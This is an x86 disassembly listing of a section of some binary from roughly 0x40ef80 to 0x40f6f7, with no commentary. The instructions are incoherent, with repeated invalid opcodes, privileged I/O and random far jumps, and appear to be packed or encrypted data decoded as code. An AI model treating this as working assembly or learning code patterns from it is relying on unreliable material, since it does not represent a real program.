  40ef80:	neg    DWORD PTR [edi-0x3dc57828]
  40ef86:	loope  0x40efe3
  40ef88:	xchg   esi,eax
  40ef89:	fcom   QWORD PTR [eax+0x3238bca8]
  40ef8f:	add    al,0xc6
  40ef91:	(bad)  
  40ef92:	fsubr  QWORD PTR [esi-0x393ff45b]
  40ef98:	jb     0x40efbb
  40ef9a:	enter  0x60a8,0x40
  40ef9e:	scas   al,BYTE PTR es:[edi]
  40ef9f:	bound  edx,QWORD PTR [esi]
  40efa1:	and    BYTE PTR [ecx-0x32],bh
  40efa4:	or     dl,BYTE PTR [esp+edx*4-0x59]
  40efa8:	add    DWORD PTR [edx+0x52],ebx
  40efab:	out    0x7,al
  40efad:	adc    esp,esp
  40efaf:	inc    ebx
  40efb0:	cli    
  40efb1:	sar    DWORD PTR [eax-0x379c6759],1
  40efb7:	xchg   DWORD PTR [edx-0x28],ecx
  40efba:	add    eax,0xdfa51c4c
  40efbf:	out    0xe4,eax
  40efc1:	push   eax
  40efc2:	inc    edx
  40efc3:	sbb    DWORD PTR [ecx+ecx*4],edx
  40efc6:	push   ebp
  40efc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efc8:	cmp    esi,edi
  40efca:	mov    ebp,edx
  40efcc:	xchg   ebp,eax
  40efcd:	sbb    al,0x2e
  40efcf:	mov    bh,BYTE PTR [ebp+0x21]
  40efd2:	(bad)  
  40efd3:	(bad)  
  40efd4:	xchg   esp,eax
  40efd5:	mov    al,0x38
  40efd7:	mov    ebp,DWORD PTR [ecx]
  40efd9:	in     al,0xf9
  40efdb:	clc    
  40efdc:	sbb    esp,esp
  40efde:	imul   ecx,DWORD PTR [ecx-0x62],0xffffff87
  40efe2:	cmc    
  40efe3:	fcmovnu st,st(0)
  40efe5:	pop    eax
  40efe6:	sub    DWORD PTR [edx+0x38d3e7db],edi
  40efec:	sahf   
  40efed:	call   0x1f60792a
  40eff2:	(bad)  
  40eff3:	ds sub al,0xac
  40eff6:	imul   eax,DWORD PTR [eax+0x39],0xec000000
  40f000:	ss ins BYTE PTR es:[edi],dx
  40f002:	or     esi,edi
  40f004:	pop    ebx
  40f005:	in     eax,dx
  40f006:	test   DWORD PTR [edi-0x26],0x3e569ed2
  40f00d:	cwde   
  40f00e:	ds out 0xf6,eax
  40f011:	add    BYTE PTR [eax],al
  40f013:	and    al,BYTE PTR [edi]
  40f015:	add    BYTE PTR [eax],al
  40f017:	jo     0x40f03b
  40f019:	mov    eax,ds:0xc0e5a698
  40f01e:	mov    ds:0x230c6168,eax
  40f023:	in     eax,dx
  40f024:	test   DWORD PTR [edi+0x62f3e261],edx
  40f02a:	dec    esp
  40f02b:	ds add eax,0x96d52090
  40f031:	sbb    eax,0x98368b5e
  40f036:	addr16 cmp eax,0xfbcf2872
  40f03c:	mov    ah,ah
  40f03e:	push   esi
  40f03f:	xlat   BYTE PTR gs:[ebx]
  40f041:	pop    eax
  40f042:	sub    al,0xf9
  40f044:	ins    DWORD PTR es:[edi],dx
  40f045:	outs   dx,DWORD PTR ds:[esi]
  40f046:	and    DWORD PTR [esp+ecx*2],ebx
  40f049:	mov    ebp,DWORD PTR [edx]
  40f04b:	push   ss
  40f04c:	mov    eax,0x465ca79b
  40f051:	mov    dh,0x25
  40f053:	push   ebx
  40f054:	and    ch,bh
  40f056:	dec    ebp
  40f057:	ret    
  40f058:	fiadd  WORD PTR [ecx-0x3a]
  40f05b:	fcomp  DWORD PTR [esi]
  40f05d:	jnp    0x40efea
  40f05f:	outs   dx,DWORD PTR ds:[esi]
  40f060:	mov    esp,0x91457c20
  40f065:	popf   
  40f066:	aas    
  40f067:	and    cl,cl
  40f069:	pushf  
  40f06a:	pop    es
  40f06b:	lahf   
  40f06c:	push   cs
  40f06d:	mov    bl,0xea
  40f06f:	jmp    0xd929:0xcf2431a9
  40f076:	jae    0x40f033
  40f078:	xchg   ebx,eax
  40f079:	ja     0x40f09b
  40f07b:	popf   
  40f07c:	mov    ch,0x8
  40f07e:	fisttp WORD PTR [ebx+eax*2]
  40f081:	imul   ebx,eax,0x99124142
  40f087:	int3   
  40f088:	pop    edx
  40f089:	call   0xeeb5c301
  40f08e:	aas    
  40f08f:	mov    ah,0x59
  40f091:	imul   esi,DWORD PTR [esi+0x3b],0xcbb383a8
  40f098:	std    
  40f099:	in     eax,dx
  40f09a:	int    0xe2
  40f09c:	cs (bad) 
  40f09e:	jge    0x40f10a
  40f0a0:	push   0x6d3135a7
  40f0a5:	mov    bh,0x2
  40f0a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0a8:	aad    0xa5
  40f0aa:	add    ebx,0xf4475dd2
  40f0b0:	xlat   BYTE PTR ds:[ebx]
  40f0b1:	sti    
  40f0b2:	xchg   edx,eax
  40f0b3:	stos   DWORD PTR es:[edi],eax
  40f0b4:	sub    dl,BYTE PTR [edx+0x3e65d72f]
  40f0ba:	add    ecx,DWORD PTR [edi]
  40f0bc:	daa    
  40f0bd:	jmp    0x40f0bd
  40f0bf:	xchg   edi,eax
  40f0c0:	imul   ebp,DWORD PTR [edi+0x3a366403],0x8d6de423
  40f0ca:	mov    dl,0x92
  40f0cc:	jbe    0x40f132
  40f0ce:	cmp    eax,0xfe695e80
  40f0d3:	fld    DWORD PTR [esi-0x36fffe15]
  40f0d9:	push   esp
  40f0da:	daa    
  40f0db:	push   edi
  40f0dc:	scas   eax,DWORD PTR es:[edi]
  40f0dd:	int    0xeb
  40f0df:	xchg   esi,eax
  40f0e0:	nop
  40f0e1:	sub    DWORD PTR [eax-0x296022c0],esp
  40f0e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0e8:	inc    edx
  40f0e9:	iret   
  40f0ea:	nop
  40f0eb:	cmp    al,0x74
  40f0ed:	ss pop es
  40f0ef:	les    ebp,FWORD PTR [eax]
  40f0f1:	add    BYTE PTR [eax],ch
  40f0f3:	xchg   ecx,eax
  40f0f4:	push   ss
  40f0f5:	cmp    DWORD PTR [edx+0x3f],ecx
  40f0f8:	cmp    al,BYTE PTR [esi-0x25]
  40f0fb:	dec    edx
  40f0fc:	pop    ss
  40f0fd:	or     DWORD PTR fs:[ebp-0x20],0xa2a73dae
  40f105:	out    dx,al
  40f106:	shl    BYTE PTR [ecx+0x198ef3ce],1
  40f10c:	inc    esi
  40f10d:	adc    al,0x30
  40f10f:	add    eax,0xf164834f
  40f114:	shr    ecx,1
  40f116:	push   cs
  40f117:	dec    dx
  40f119:	daa    
  40f11a:	fadd   st(2),st
  40f11c:	inc    ebx
  40f11d:	fcom   QWORD PTR [ebx-0x28e69d88]
  40f123:	icebp  
  40f124:	cmp    DWORD PTR [ebx],eax
  40f126:	xchg   DWORD PTR [edx],ebx
  40f128:	lods   eax,DWORD PTR ds:[esi]
  40f129:	inc    edx
  40f12a:	out    dx,eax
  40f12b:	pop    es
  40f12c:	inc    ebx
  40f12d:	inc    esi
  40f12e:	aam    0x12
  40f130:	mov    cl,0x5c
  40f132:	and    bl,BYTE PTR [ebx-0x6415067]
  40f138:	cmp    eax,0x128a7a6f
  40f13d:	fwait
  40f13e:	and    eax,0xe007bd9b
  40f143:	sti    
  40f144:	cmp    al,0xd2
  40f146:	idiv   DWORD PTR [eax]
  40f148:	retf   0xd9e6
  40f14b:	inc    esp
  40f14c:	imul   eax,DWORD PTR [ebp+0x53],0x30
  40f150:	ja     0x40f175
  40f152:	imul   edx,DWORD PTR [edi+0x2e1737aa],0x0
  40f159:	lods   eax,DWORD PTR ds:[esi]
  40f15a:	push   esi
  40f15b:	pop    edi
  40f15c:	xchg   ebx,eax
  40f15d:	jnp    0x40f16b
  40f15f:	stc    
  40f160:	add    DWORD PTR [eax+0x22],0x58
  40f164:	cs mov ecx,0x7e8712be
  40f16a:	jb     0x40f168
  40f16c:	aad    0x11
  40f16e:	cs pop eax
  40f170:	mov    al,0xb
  40f172:	adc    DWORD PTR [ecx+edi*2-0x24a36533],ebx
  40f179:	jmp    0xafd9:0x359192c5
  40f180:	aad    0xc8
  40f182:	(bad)  
  40f183:	(bad)  [esi+edi*4-0x581d58b8]
  40f18a:	and    al,BYTE PTR [ebp-0x5e]
  40f18d:	rcr    esp,1
  40f18f:	cdq    
  40f190:	loope  0x40f136
  40f192:	test   BYTE PTR [edx-0x4c],bl
  40f195:	dec    ebp
  40f196:	leave  
  40f197:	add    eax,0xc3ad40c1
  40f19c:	cmc    
  40f19d:	(bad)  
  40f19e:	jmp    0xa7e2:0x1755e1b2
  40f1a5:	dec    esp
  40f1a6:	dec    eax
  40f1a7:	xor    BYTE PTR [edi*1+0x7850f879],bl
  40f1ae:	fs pop ecx
  40f1b0:	inc    ecx
  40f1b1:	xchg   DWORD PTR ds:0xf8edda5f,esp
  40f1b7:	mov    bh,0x73
  40f1b9:	jns    0x40f169
  40f1bb:	jbe    0x40f17d
  40f1bd:	and    BYTE PTR [ecx-0x10f919e9],dh
  40f1c3:	mov    ds:0xa323a1f4,al
  40f1c8:	or     esi,ebp
  40f1ca:	(bad)  [ebx]
  40f1cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1cd:	jmp    0x86a2:0xbc948cfa
  40f1d4:	mov    al,ds:0x794bd87c
  40f1d9:	push   ebx
  40f1da:	(bad)  
  40f1db:	hlt    
  40f1dc:	aas    
  40f1dd:	push   ecx
  40f1de:	jmp    0x90eb:0x4101297c
  40f1e5:	fwait
  40f1e6:	cdq    
  40f1e7:	ja     0x40f1b0
  40f1e9:	in     eax,dx
  40f1ea:	inc    BYTE PTR [edx+esi*4-0x11]
  40f1ee:	je     0x40f173
  40f1f0:	lods   al,BYTE PTR ds:[esi]
  40f1f1:	in     eax,dx
  40f1f2:	adc    BYTE PTR [eax],bh
  40f1f4:	call   0x2a63dea2
  40f1f9:	imul   esi,DWORD PTR [ecx+0x4aa87b6c],0xbe9d22b5
  40f203:	dec    edx
  40f204:	xor    al,0x84
  40f206:	jno    0x40f24a
  40f208:	inc    ebx
  40f209:	push   ds
  40f20a:	mov    eax,ds:0xd47997cf
  40f20f:	frstor [esi-0x76]
  40f212:	outs   dx,DWORD PTR ds:[esi]
  40f213:	mov    ebp,0x154131d4
  40f218:	fcom   DWORD PTR [eax-0x34cc1c25]
  40f21e:	pop    edx
  40f21f:	shl    DWORD PTR [eax],1
  40f221:	dec    edx
  40f222:	add    al,0x18
  40f224:	jmp    0x8068ec59
  40f229:	xor    al,0x7d
  40f22b:	inc    edi
  40f22c:	jmp    0x40f1b3
  40f22e:	xor    DWORD PTR [edi+0x6e],esp
  40f231:	mov    ds:0x54497ceb,eax
  40f236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f237:	lods   eax,DWORD PTR ds:[esi]
  40f238:	push   0xdcb04d6a
  40f23d:	scas   al,BYTE PTR es:[edi]
  40f23e:	stos   BYTE PTR es:[edi],al
  40f23f:	jbe    0x40f278
  40f241:	loope  0x40f2ad
  40f243:	or     DWORD PTR [ebx+ecx*4+0x302f1f9a],esi
  40f24a:	jne    0x40f1f4
  40f24c:	jge    0x40f2c8
  40f24e:	or     ebp,DWORD PTR [edi-0x3]
  40f251:	mov    ecx,DWORD PTR [ebp-0x374e315d]
  40f257:	lea    edx,[edi+0xf1c14ec]
  40f25d:	mov    ecx,0xb9b196c2
  40f262:	pop    ebp
  40f263:	fisttp DWORD PTR [esi+0x19]
  40f266:	jg     0x40f2b0
  40f268:	or     BYTE PTR [edx+0x5f],cl
  40f26b:	stc    
  40f26c:	mov    esi,?
  40f26e:	xchg   ecx,eax
  40f26f:	mov    edi,DWORD PTR [eax]
  40f271:	xor    al,0xd3
  40f273:	retf   
  40f274:	inc    esp
  40f275:	xchg   al,dl
  40f277:	jl     0x40f2f6
  40f279:	mov    cl,0x17
  40f27b:	add    al,0x10
  40f27d:	cmp    eax,0xffffffd5
  40f280:	jns    0x40f277
  40f282:	jbe    0x40f254
  40f284:	pop    esi
  40f285:	mov    cl,0x6f
  40f287:	cld    
  40f288:	les    ebx,FWORD PTR [edi+esi*8+0x59]
  40f28c:	out    dx,eax
  40f28d:	nop    ebp
  40f290:	pushf  
  40f291:	mov    al,0x1d
  40f293:	inc    ecx
  40f294:	jmpw   0xce05
  40f298:	xchg   ecx,edx
  40f29a:	fst    QWORD PTR [esi+0x29430b6d]
  40f2a0:	aas    
  40f2a1:	sbb    esp,DWORD PTR [edx-0x3f]
  40f2a4:	push   ebx
  40f2a5:	sbb    ch,ch
  40f2a7:	call   0x72e8:0x55aad78d
  40f2ae:	bound  ecx,QWORD PTR ds:0xc25f7a3f
  40f2b4:	xchg   ebp,eax
  40f2b5:	dec    esi
  40f2b6:	pop    ss
  40f2b7:	inc    edi
  40f2b8:	add    eax,0x745a5170
  40f2bd:	sub    eax,0xe9058aab
  40f2c2:	aad    0x1f
  40f2c4:	cmp    DWORD PTR [ebx+0x6a86f129],0xffffffc9
  40f2cb:	push   0xa813fc56
  40f2d0:	loope  0x40f2c1
  40f2d2:	out    dx,eax
  40f2d3:	and    eax,0x17ca9237
  40f2d8:	xor    eax,0x4b008eb5
  40f2dd:	push   ecx
  40f2de:	pop    ecx
  40f2df:	fwait
  40f2e0:	xchg   esi,eax
  40f2e1:	fwait
  40f2e2:	pop    DWORD PTR [ecx-0x26]
  40f2e5:	adc    DWORD PTR [esi-0x13],ecx
  40f2e8:	add    al,0x3a
  40f2ea:	inc    esp
  40f2eb:	movzx  ebx,WORD PTR [ebp-0x3e]
  40f2ef:	js     0x40f330
  40f2f1:	test   eax,0xfafbf0b9
  40f2f6:	mov    bl,0x34
  40f2f8:	das    
  40f2f9:	sti    
  40f2fa:	int    0xfc
  40f2fc:	sbb    BYTE PTR [ebx+eiz*8-0x4c],al
  40f300:	ja     0x40f2b7
  40f302:	iret   
  40f303:	dec    edx
  40f304:	sbb    dh,BYTE PTR [eax-0x34]
  40f307:	fdiv   st,st(5)
  40f309:	or     BYTE PTR [esi],0x51
  40f30c:	cmp    DWORD PTR [eax-0x6ddb1216],eax
  40f312:	mov    al,ds:0xda397101
  40f317:	mov    dl,0x14
  40f319:	inc    ecx
  40f31a:	cli    
  40f31b:	test   eax,0x7d59d51e
  40f320:	dec    esp
  40f321:	add    ah,ch
  40f323:	inc    esp
  40f324:	mov    bl,0xad
  40f326:	or     cl,BYTE PTR [ecx+0x6672ed1]
  40f32c:	or     eax,0xa73dfa11
  40f331:	or     esi,DWORD PTR [ecx+ebp*4-0x7ae8bce4]
  40f338:	sub    eax,0xf3485032
  40f33d:	dec    eax
  40f33e:	dec    ecx
  40f33f:	sbb    esp,DWORD PTR [edx+eiz*4]
  40f342:	cli    
  40f343:	mov    edi,0xda720dc5
  40f348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f349:	xchg   edi,eax
  40f34a:	(bad)  
  40f34c:	or     DWORD PTR [edi+0x3f],esp
  40f34f:	lahf   
  40f350:	fisub  DWORD PTR [ebx]
  40f352:	loopne 0x40f306
  40f354:	cmp    al,0x3c
  40f356:	push   es
  40f357:	scas   al,BYTE PTR es:[edi]
  40f358:	or     ah,dh
  40f35a:	fldenv [edi]
  40f35c:	mov    ds:0xbe76befa,al
  40f361:	int3   
  40f362:	push   ebx
  40f363:	mov    DWORD PTR [eax+0x296b5935],0x2875a88
  40f36d:	jmp    0x40f38e
  40f36f:	fisubr WORD PTR [ebx]
  40f371:	call   0xf758:0xede37558
  40f378:	addr16 jmp 0x290a:0x4820e21b
  40f380:	pusha  
  40f381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f382:	dec    ebx
  40f383:	adc    ebx,eax
  40f385:	jns    0x40f338
  40f387:	sub    ebx,esi
  40f389:	mov    DWORD PTR ds:0xff4bcaa9,eax
  40f38f:	push   ecx
  40f390:	and    DWORD PTR [esp+0x37335bd4],edx
  40f397:	imul   BYTE PTR [ecx+0x3749be68]
  40f39d:	sar    BYTE PTR [ecx],cl
  40f39f:	xchg   DWORD PTR [edi-0x48203b67],ebp
  40f3a5:	xchg   edi,eax
  40f3a6:	mov    dl,0x6b
  40f3a8:	cmp    eax,0x47222f3d
  40f3ad:	aas    
  40f3ae:	retf   0xaeb
  40f3b1:	mov    esi,0x263ead9a
  40f3b6:	imul   edx,DWORD PTR [esi+0x3],0xb722d804
  40f3bd:	loop   0x40f368
  40f3bf:	sub    eax,0xc905c5e1
  40f3c4:	test   eax,0x24e08421
  40f3c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3ca:	xchg   DWORD PTR [edx-0x33],edx
  40f3cd:	imul   esi,DWORD PTR [esi+0x2f],0xe76ee5f2
  40f3d4:	or     al,0xd1
  40f3d6:	sub    eax,0x38ad6ae8
  40f3db:	add    esp,esi
  40f3dd:	imul   edi,DWORD PTR [edi-0x76],0xffffffc1
  40f3e1:	dec    edx
  40f3e2:	push   ebp
  40f3e3:	icebp  
  40f3e4:	adc    al,0x6d
  40f3e6:	adc    eax,0xaa2dd99e
  40f3eb:	in     eax,dx
  40f3ec:	in     al,0xaa
  40f3ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3ef:	cdq    
  40f3f0:	(bad)  
  40f3f1:	loope  0x40f3f0
  40f3f3:	push   edx
  40f3f4:	ret    0x211e
  40f3f7:	jae    0x40f3aa
  40f3f9:	and    dh,BYTE PTR [edx+0x4257602d]
  40f3ff:	stc    
  40f400:	mov    WORD PTR [ebx-0x6fb99d9d],ss
  40f406:	push   edx
  40f407:	int3   
  40f408:	pop    esi
  40f409:	push   ds
  40f40a:	les    esp,FWORD PTR [eax-0x77eb0548]
  40f410:	push   esi
  40f411:	jno    0x40f3ad
  40f413:	or     esi,DWORD PTR [esi+0x2]
  40f416:	(bad)  
  40f417:	ins    BYTE PTR es:[edi],dx
  40f418:	push   0xffffffdf
  40f41a:	or     BYTE PTR [esi],al
  40f41c:	out    0x1f,eax
  40f41e:	enter  0xa295,0x8a
  40f422:	js     0x40f412
  40f424:	outs   dx,BYTE PTR ds:[esi]
  40f425:	punpcklbw mm3,DWORD PTR [ebx+0x58becfcc]
  40f42c:	int    0x58
  40f42e:	pushf  
  40f42f:	dec    ebx
  40f430:	cwde   
  40f431:	add    DWORD PTR [edx+0x19],eax
  40f434:	inc    esi
  40f435:	jb     0x40f421
  40f437:	outs   dx,DWORD PTR ds:[esi]
  40f438:	adc    eax,0xb8d7531b
  40f43d:	jns    0x40f481
  40f43f:	jo     0x40f46e
  40f441:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f442:	jmp    0x40f3ef
  40f444:	xchg   ecx,eax
  40f445:	cmp    BYTE PTR [edi+0x2d621a35],al
  40f44b:	nop
  40f44c:	aas    
  40f44d:	mov    dl,0x95
  40f44f:	push   edi
  40f450:	and    esi,DWORD PTR [edi-0x7208b18e]
  40f456:	adc    al,0x4f
  40f458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f459:	outs   dx,DWORD PTR ds:[esi]
  40f45a:	mov    bh,0xf3
  40f45c:	sub    al,0x4a
  40f45e:	lods   eax,DWORD PTR ds:[esi]
  40f45f:	lahf   
  40f460:	xchg   edi,eax
  40f461:	or     bl,cl
  40f463:	xor    eax,0x38a62354
  40f468:	scas   eax,DWORD PTR es:[edi]
  40f469:	sub    bh,dh
  40f46b:	mov    esi,0xe8a44fb4
  40f470:	idiv   DWORD PTR [edi]
  40f472:	cmp    esi,DWORD PTR [ebx-0x2a]
  40f475:	jae    0x40f422
  40f477:	rol    DWORD PTR [eax-0x7c],0x36
  40f47b:	scas   al,BYTE PTR es:[edi]
  40f47c:	test   DWORD PTR [esi+0x17],ebp
  40f47f:	push   ebx
  40f480:	or     BYTE PTR [edx+eax*1+0xc9b998a],bh
  40f487:	fiadd  DWORD PTR cs:[edx+0x31]
  40f48b:	add    al,0xb5
  40f48d:	xor    eax,0x6ff4d2bf
  40f492:	jae    0x40f4f4
  40f494:	pop    edx
  40f495:	ins    BYTE PTR es:[edi],dx
  40f496:	cmp    edx,ebx
  40f498:	cli    
  40f499:	ja     0x40f465
  40f49b:	add    BYTE PTR [ebx-0x2d],dl
  40f49e:	pop    ds
  40f49f:	scas   al,BYTE PTR es:[edi]
  40f4a0:	scas   al,BYTE PTR es:[edi]
  40f4a1:	call   0xbefc:0x280b594f
  40f4a8:	dec    ecx
  40f4a9:	dec    esi
  40f4aa:	aas    
  40f4ab:	ja     0x40f514
  40f4ad:	and    eax,0x79899989
  40f4b2:	call   0x633c:0xf8a5a231
  40f4b9:	pop    ebx
  40f4ba:	test   al,0x43
  40f4bc:	push   eax
  40f4bd:	scas   al,BYTE PTR es:[edi]
  40f4be:	hlt    
  40f4bf:	pop    esi
  40f4c0:	pop    eax
  40f4c1:	retf   
  40f4c2:	jmp    0xce0e57dd
  40f4c7:	mov    bh,BYTE PTR [ebx+ecx*4-0x3]
  40f4cb:	push   ebx
  40f4cc:	int    0xae
  40f4ce:	mov    edx,0x2282f086
  40f4d3:	in     al,0xdd
  40f4d5:	xchg   ecx,eax
  40f4d6:	stc    
  40f4d7:	mov    esp,0x6cd9a068
  40f4dc:	lods   eax,DWORD PTR ds:[esi]
  40f4dd:	mov    edx,0x4363b7ab
  40f4e2:	iret   
  40f4e3:	mov    ds:0x6e08205a,eax
  40f4e8:	out    dx,eax
  40f4e9:	sbb    esi,DWORD PTR [ecx+0x5f]
  40f4ec:	jmp    0xfd03:0xa362a706
  40f4f3:	pushf  
  40f4f4:	cs hlt 
  40f4f6:	inc    edx
  40f4f7:	aas    
  40f4f8:	enter  0xc91a,0x80
  40f4fc:	and    ah,BYTE PTR [edx-0x769e6447]
  40f502:	add    BYTE PTR [edx],0xa
  40f505:	je     0x40f56a
  40f507:	fmul   DWORD PTR [ecx-0x20]
  40f50a:	mov    eax,0x22644e84
  40f50f:	pop    eax
  40f510:	ror    dh,cl
  40f512:	std    
  40f513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f514:	jbe    0x40f4f9
  40f516:	inc    eax
  40f517:	fs pushf 
  40f519:	lds    ebp,FWORD PTR [ebp-0x68]
  40f51c:	sbb    al,BYTE PTR [eax]
  40f51e:	cmp    al,0xb1
  40f520:	shr    DWORD PTR [ecx],0xa1
  40f523:	xchg   esi,eax
  40f524:	(bad)  
  40f525:	sbb    edx,DWORD PTR [esi+eiz*4]
  40f528:	inc    ebp
  40f529:	ret    
  40f52a:	loopne 0x40f534
  40f52c:	mov    esi,0x91078e40
  40f531:	jne    0x40f541
  40f533:	or     dl,bh
  40f535:	in     al,dx
  40f536:	jb     0x40f508
  40f538:	(bad)
  40f53b:	adc    eax,edi
  40f53d:	mov    bh,0x7a
  40f53f:	push   ebx
  40f540:	icebp  
  40f541:	sub    eax,0xfb5df103
  40f546:	mov    al,0x34
  40f548:	stos   DWORD PTR es:[edi],eax
  40f549:	push   edx
  40f54a:	pop    es
  40f54b:	jns    0x40f4fc
  40f54d:	out    dx,al
  40f54e:	js     0x40f557
  40f550:	(bad)  
  40f551:	xchg   edi,eax
  40f552:	push   0x102c3005
  40f557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f558:	xor    eax,0x36afbfab
  40f55d:	lods   al,BYTE PTR ds:[esi]
  40f55e:	cli    
  40f55f:	lods   al,BYTE PTR ds:[esi]
  40f560:	or     eax,0xb6e08b33
  40f565:	pusha  
  40f566:	aad    0x64
  40f568:	xor    BYTE PTR [edi-0x1e],cl
  40f56b:	popf   
  40f56c:	inc    ecx
  40f56d:	dec    esi
  40f56e:	pop    ecx
  40f56f:	add    BYTE PTR ds:0x65b7e45,0x93
  40f576:	xchg   edx,eax
  40f577:	stos   BYTE PTR es:[edi],al
  40f578:	test   DWORD PTR [eax-0x70],0x838854c5
  40f57f:	loope  0x40f567
  40f581:	fiadd  DWORD PTR [eax+0x32]
  40f584:	jns    0x40f54e
  40f586:	lods   eax,DWORD PTR ds:[esi]
  40f587:	jnp    0x40f5ba
  40f589:	cmp    al,0xa3
  40f58b:	sub    ebx,DWORD PTR [ebx-0x1c]
  40f58e:	add    eax,DWORD PTR [eax-0x10ba8f46]
  40f594:	fisub  WORD PTR [esi]
  40f596:	iret   
  40f597:	dec    eax
  40f598:	scas   eax,DWORD PTR es:[edi]
  40f599:	push   ss
  40f59a:	inc    ebx
  40f59b:	jbe    0x40f54c
  40f59d:	push   eax
  40f59e:	pop    es
  40f59f:	pop    ss
  40f5a0:	outs   dx,DWORD PTR ds:[esi]
  40f5a1:	fild   QWORD PTR [edi+0x56]
  40f5a4:	leave  
  40f5a5:	push   cs
  40f5a6:	out    dx,al
  40f5a7:	aaa    
  40f5a8:	pop    edx
  40f5a9:	jecxz  0x40f5cd
  40f5ab:	mov    ds:0x97b16cc5,al
  40f5b0:	adc    ah,bl
  40f5b2:	jnp    0x40f5c2
  40f5b4:	xlat   BYTE PTR ds:[ebx]
  40f5b5:	and    eax,0x6ccf33c1
  40f5ba:	xchg   DWORD PTR [edx+0x45],ebp
  40f5bd:	xchg   ecx,eax
  40f5be:	sbb    eax,ebp
  40f5c0:	ss ret 0xaca3
  40f5c4:	pop    ds
  40f5c5:	enter  0x1ec2,0x73
  40f5c9:	mov    edi,0x865c968e
  40f5ce:	mov    BYTE PTR [ebp-0x22],bh
  40f5d1:	add    DWORD PTR [esp+edi*8+0x3ed3c9e9],esp
  40f5d8:	push   cs
  40f5d9:	pop    edx
  40f5da:	mov    bh,0x63
  40f5dc:	mov    al,BYTE PTR [edx-0x10a9e3b7]
  40f5e2:	mov    ch,0x31
  40f5e4:	shr    DWORD PTR [ebx+0x73d33bf5],1
  40f5ea:	(bad)  
  40f5eb:	dec    esp
  40f5ec:	call   DWORD PTR [ecx-0x6340c095]
  40f5f2:	mov    eax,0x40993214
  40f5f7:	mov    dh,0xfc
  40f5f9:	mov    ecx,0x7f8d1586
  40f5fe:	or     esp,esp
  40f600:	test   al,0x9c
  40f602:	dec    edx
  40f603:	test   al,0x43
  40f605:	xor    BYTE PTR [ebp-0x2f350a89],bl
  40f60b:	xchg   edi,eax
  40f60c:	mov    bl,0x80
  40f60e:	mov    al,0x74
  40f610:	aad    0x67
  40f612:	test   dl,al
  40f614:	or     ebp,DWORD PTR [ebx+0x107c0204]
  40f61a:	int3   
  40f61b:	or     al,0x49
  40f61d:	fcom   DWORD PTR [eax-0x78659a41]
  40f623:	sbb    al,0xc4
  40f625:	nop    ebp
  40f628:	cmp    ebx,DWORD PTR ds:0x3be9d9ac
  40f62e:	mov    eax,ds:0x6633c28d
  40f633:	mov    dl,0xd2
  40f635:	pop    ebp
  40f636:	pop    eax
  40f637:	jg     0x40f681
  40f639:	fs fwait
  40f63b:	out    0x8e,al
  40f63d:	and    DWORD PTR [edx],ecx
  40f63f:	jbe    0x40f5ea
  40f641:	test   BYTE PTR [esi],0x45
  40f644:	xor    eax,0x40cd171
  40f649:	xor    BYTE PTR [ebp-0x4d],bh
  40f64c:	inc    esp
  40f64d:	jb     0x40f611
  40f64f:	lds    eax,FWORD PTR [eax-0x11cc4841]
  40f655:	sbb    DWORD PTR [edx+0x5b],ecx
  40f658:	mov    DWORD PTR [esi],ecx
  40f65a:	inc    BYTE PTR [ebp+0x493fabf1]
  40f660:	lahf   
  40f661:	adc    eax,0x7bb7001c
  40f666:	dec    eax
  40f667:	mov    ds:0xcfa6c81c,al
  40f66c:	lea    eax,[eax-0x5a]
  40f66f:	jnp    0x40f6a9
  40f671:	mov    dh,0xf6
  40f673:	push   eax
  40f674:	cmp    bl,BYTE PTR [edi+edx*4+0x7e]
  40f678:	push   es
  40f679:	pop    ecx
  40f67a:	popf   
  40f67b:	in     al,0xfb
  40f67d:	bound  ebp,QWORD PTR [ebx]
  40f67f:	js     0x40f6e7
  40f681:	cmp    DWORD PTR [ecx-0x30],ebp
  40f684:	dec    edx
  40f685:	rol    ecx,1
  40f687:	or     bh,ch
  40f689:	repnz sbb cl,ah
  40f68c:	adc    DWORD PTR [edi-0xc80eb3],ebx
  40f692:	dec    ebx
  40f693:	outs   dx,DWORD PTR ds:[esi]
  40f694:	cmp    eax,0xd08d9e7d
  40f699:	loope  0x40f6cf
  40f69b:	and    BYTE PTR [ebx-0x53acb4a6],cl
  40f6a1:	neg    DWORD PTR [eax]
  40f6a3:	int3   
  40f6a4:	jo     0x40f6a1
  40f6a6:	lods   al,BYTE PTR ds:[esi]
  40f6a7:	cmc    
  40f6a8:	scas   al,BYTE PTR es:[edi]
  40f6a9:	dec    eax
  40f6aa:	pcmpeqd mm7,QWORD PTR [esp+eax*2-0x32682342]
  40f6b2:	fsub   DWORD PTR [eax+ebp*4+0x2]
  40f6b6:	(bad)  
  40f6b7:	dec    ebx
  40f6b8:	xchg   ebp,eax
  40f6b9:	shl    BYTE PTR [esi+esi*4],1
  40f6bc:	ret    
  40f6bd:	mov    DWORD PTR ds:0x47c97435,eax
  40f6c3:	inc    esp
  40f6c4:	push   edx
  40f6c5:	mov    esp,0xf72198ae
  40f6ca:	enter  0xc47d,0x2e
  40f6ce:	dec    ebx
  40f6cf:	mov    eax,ds:0x7d1322ee
  40f6d4:	cmp    bh,ch
  40f6d6:	add    al,0xa
  40f6d8:	inc    ecx
  40f6d9:	aas    
  40f6da:	cmp    al,0xba
  40f6dc:	dec    eax
  40f6dd:	retf   
  40f6de:	xor    DWORD PTR ds:0xe25380a5,esp
  40f6e4:	jle    0x40f676
  40f6e6:	call   0xb1a8:0xc658c278
  40f6ed:	mov    bh,BYTE PTR [ecx]
  40f6ef:	fidiv  DWORD PTR [ebx]
  40f6f1:	mov    cl,0x86
  40f6f3:	rcl    edi,0x4e
  40f6f6:	clc    
  40f6f7:	mov    al,es:0x498fff1f
